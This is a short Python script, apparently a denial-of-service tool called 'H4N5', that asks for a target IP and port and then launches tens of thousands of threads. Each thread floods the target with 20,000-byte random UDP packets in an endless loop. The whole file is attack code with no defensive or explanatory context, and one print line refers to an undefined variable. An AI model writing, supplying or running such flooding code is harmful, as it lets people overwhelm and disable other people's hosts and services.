import random
import socket
import threading

print("#-- H4N5 --#")

ip = str(input(" Ip :"))
port = int(input(" Port :"))
choice = str(input(" UDP(y/n) :"))
def udp():
	data = random._urandom(20000)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(75000):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[H4N5] Sent!!! %s Port %s"%(ip,port))

for y in range(55000):
	if choice == 'y':
		th = threading.Thread(target = udp)
		th.start()